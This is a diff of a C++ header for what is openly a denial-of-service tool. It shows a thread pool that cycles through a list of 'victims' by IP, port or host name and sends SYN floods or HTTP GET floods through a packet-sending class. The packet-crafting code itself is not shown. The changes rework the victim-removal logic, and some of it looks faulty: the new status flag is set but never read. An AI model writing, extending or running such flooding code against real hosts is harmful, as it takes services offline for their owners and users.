@@ -13,20 +13,20 @@
 
 struct src_dst
 {
-    const char* source_ip;
-    const char* source_port;
-    const char* dest_ip;
-    const char* dest_port;
+    int source_ip;
+    int source_port;
+    int dest_ip;
+    int dest_port;
     int flood_type;
     const char* host_name;
+    int status;
 };
 
 class thread_pool
 {
 public:
-    packet_sending send;
 
-    explicit thread_pool(int threads) : send()
+    explicit thread_pool(int threads)
     {
         start(threads);
     }
@@ -35,6 +35,7 @@ public:
     {
         stop();
     }
+
 
     void enqueue(src_dst ports_ips)
     {
@@ -62,8 +63,8 @@ public:
         {
             std::unique_lock<std::mutex> lock{event_mutex};
             src_dst poison{};
-            poison.source_port = nullptr;
-            tasks_per_thread[thread_num].push_front(poison);
+            poison.source_port = 0;
+            tasks_per_thread[thread_num].push_back(poison);
         }
     }
 
@@ -71,73 +72,68 @@ public:
     {
         {
             std::unique_lock<std::mutex> lock{event_mutex};
-            victims_to_remove.push_back(ips_ports_to_remove);
+	    int found = 0;
+	    for (int i = 0; i < tasks_per_thread.size(); i++)
+	    {
+		    for (int j = 0; j < tasks_per_thread[i].size(); j++)
+		    {
+			    if ((ips_ports_to_remove.dest_port == tasks_per_thread[i][j].dest_port
+				 && ips_ports_to_remove.dest_ip == tasks_per_thread[i][j].dest_ip)
+				|| ips_ports_to_remove.host_name == tasks_per_thread[i][j].host_name)
+			    {
+//				    tasks_per_thread[i].erase(tasks_per_thread[i].cbegin()+j);
+				    tasks_per_thread[i][j].status = 1;
+				    found = 1;
+				    break;
+			    }
+		    }
+		    if (found) break;
+	    }
         }
     }
-
 
 private:
     std::vector<std::thread> threads_m;
     std::condition_variable event_char_m;
     std::mutex event_mutex;
     bool stop_m = false;
-    std::unordered_map<size_t, std::deque<src_dst>> tasks_per_thread;
-    std::vector<src_dst> victims_to_remove;
-    size_t pause_between_send = 3;
+    std::unordered_map<size_t, std::vector<src_dst>> tasks_per_thread;
 
     void start(int threads)
     {
         for (auto i = 0; i < threads; i++)
         {
             threads_m.emplace_back([=] {
-                int attacked_victims = 0;
                 while(true)
-                {
-                    src_dst ips_ports;
-                    {
-                        std::unique_lock<std::mutex> lock{event_mutex};
-                        event_char_m.wait(lock, [=] {return stop_m || !tasks_per_thread[i].empty();});
-                        if (stop_m && tasks_per_thread[i].empty())
-                            break;
+		{
+			int stop = 0;
+			{
+				std::unique_lock<std::mutex> lock{event_mutex};
+				for (int j = 0; j < tasks_per_thread[i].size(); j++)
+				{
+					src_dst ips_ports{};
+					event_char_m.wait(lock, [=] { return stop_m || !tasks_per_thread[i].empty(); });
+					if (stop_m || tasks_per_thread[i].empty()) {
+						stop = 1;
+						break;
+					}
 
-                        ips_ports = std::move(tasks_per_thread[i].front());
-                        tasks_per_thread[i].pop_front();
-                        if (ips_ports.source_port == nullptr)
-                        {
-                            tasks_per_thread[i].clear();
-                            break;
-                        }
-                        int in = 0;
-                        for (int j = 0; j < victims_to_remove.size(); j++)
-                        {
-                            if ((victims_to_remove[j].dest_port == ips_ports.dest_port
-                                && victims_to_remove[j].dest_ip == ips_ports.dest_ip)
-                                || victims_to_remove[j].host_name == ips_ports.host_name)
-                            {
-                                in = 1;
-                                victims_to_remove.erase(victims_to_remove.cbegin()+j);
-                                break;
-                            }
-                        }
-                        if (!in)
-                        {
-                            tasks_per_thread[i].push_back(ips_ports);
-                        }
-                        attacked_victims += 1;
-                        if (attacked_victims == tasks_per_thread[i].size())
-                        {
-                            attacked_victims = 0;
-                            sleep(pause_between_send);
-                        }
-                    }
-                    if (ips_ports.flood_type == SYN_FLOOD)
-                    {
-                        send.send_tcp(ips_ports.source_ip, ips_ports.source_port, ips_ports.dest_ip, ips_ports.dest_port);
-                    } else if (ips_ports.flood_type == HTTP_FLOOD)
-                    {
-                        send.send_get_request(ips_ports.host_name);
-                    }
-                }
+					ips_ports = tasks_per_thread[i][j];
+					if (ips_ports.source_port == 0) {
+						stop = 1;
+						tasks_per_thread[i].clear();
+						break;
+					}
+					if (ips_ports.flood_type == SYN_FLOOD) {
+						packet_sending::send_tcp(ips_ports.source_ip, ips_ports.source_port,
+									 ips_ports.dest_ip, ips_ports.dest_port);
+					} else if (ips_ports.flood_type == HTTP_FLOOD) {
+						packet_sending::send_get_request(ips_ports.host_name);
+					}
+				}
+			}
+			if (stop) break;
+		}
             });
         }
     }
